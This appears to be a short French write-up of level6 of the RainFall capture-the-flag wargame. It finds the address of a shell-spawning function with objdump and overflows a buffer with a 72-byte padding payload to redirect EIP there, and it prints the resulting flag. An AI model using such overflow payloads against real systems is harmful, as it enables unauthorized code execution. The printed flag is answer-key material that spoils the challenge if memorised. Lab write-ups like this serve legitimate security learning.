# Analyse du code

Dans le code nous voyons qu'il n'y a pas de controle dans les inputs utilisateur. il y a une fonction  n(), qui execute un bash.
On va exploiter ce buffer overflow en redirigant EIP vers n()

# Preparation du payload

- Trouver l'adresse de n() :
	level6@RainFall:~$  objdump -t ./level6  | grep n
	08048454 g     F .text  00000014              n
- payload 
	$(python -c "print('a'*72 + '\x54\x84\x04\x08')")

# Exploit
	prend en argument !!!!!!!!!!!!!!!!!!!!
	./level6 $(python -c "print('a' * 72 + '\x54\x84\x04\x08')")
	f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d